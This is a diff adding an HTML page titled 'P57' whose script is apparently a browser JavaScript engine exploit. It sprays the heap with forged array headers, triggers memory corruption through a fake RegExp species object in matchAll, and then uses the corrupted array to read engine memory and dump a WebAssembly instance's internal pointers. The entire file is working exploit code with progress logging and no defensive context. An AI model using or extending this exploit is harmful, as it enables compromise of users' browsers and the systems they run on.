@@ -1,0 +1,90 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P57</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  // Find LIVE objB
+  const cands=[];
+  for(let k=0x8000;k<0x10010;k++){
+    try{
+      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){
+        if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;
+          if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}
+      }
+    }catch(e){break;}
+    if(cands.length>=6)break;
+  }
+  let OB=-1;
+  for(const k of cands){
+    const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;
+    if(a!==b){OB=k;break;}
+  }
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    objB[4]=wasmI;const wp=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    log("W:"+wp.toString(16));
+    // Read WasmInstance at cage+(wp&~1)
+    const wr=wp&0xFFFFFFFE;
+    const wOff=wr-0x1080018;
+    // heapRead helper: read 8 bytes from cage+addr
+    function hr(addr){
+      const off=addr-0x1080018;
+      if(off<0||off>0x3FFFFFFE0)return 0n;
+      return f2i(m[Math.floor(off/8)]);
+    }
+    // Read WasmInstance first 4 QWORDs
+    const wi=[];for(let i=0;i<4;i++)wi.push(hr(wr+i*8));
+    log("WI:"+wi.map(x=>x.toString(16)).join(","));
+    // Extract cage pointers from WasmInstance
+    // QWORD2 has two cage pointers (lo32 and hi32)
+    const ptr1=Number(wi[2]&0xffffffffn)&0xFFFFFFFE; // detagged
+    const ptr2=Number(wi[2]>>32n)&0xFFFFFFFE;        // detagged
+    log("P1:"+ptr1.toString(16)+" P2:"+ptr2.toString(16));
+    // Read first 8 QWORDs of each pointed-to object
+    if(ptr1>0x1000000&&ptr1<0x20000000){
+      const o1=[];for(let i=0;i<8;i++)o1.push(hr(ptr1+i*8));
+      log("O1:"+o1.map(x=>x.toString(16)).slice(0,4).join(","));
+      log("O1b:"+o1.map(x=>x.toString(16)).slice(4).join(","));
+    }
+    if(ptr2>0x1000000&&ptr2<0x20000000){
+      const o2=[];for(let i=0;i<8;i++)o2.push(hr(ptr2+i*8));
+      log("O2:"+o2.map(x=>x.toString(16)).slice(0,4).join(","));
+      log("O2b:"+o2.map(x=>x.toString(16)).slice(4).join(","));
+    }
+  }else{log("STALE");}
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
